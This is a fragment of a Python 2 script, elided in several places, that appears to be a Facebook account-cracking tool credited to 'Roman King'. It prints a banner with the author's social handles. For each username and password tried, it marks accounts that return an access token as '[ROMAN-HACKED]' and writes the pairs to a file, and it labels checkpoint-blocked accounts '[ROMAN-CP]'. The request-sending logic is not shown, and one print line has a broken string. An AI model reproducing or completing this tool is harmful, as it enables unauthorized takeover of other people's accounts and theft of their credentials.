...
print("\033[0;91mThis Tool's Free By Roman King")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : ROMAN-KING'
    print '\033[0;94mFACEBOOK : Hi.Baby.Its.Me.roman.king.20b'
    print '\033[0;93m TEAM    :NANA NATI KING
    print '\033[0;96mGITHUB   : KING-ROMAN'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[ROMAN-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[ROMAN-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
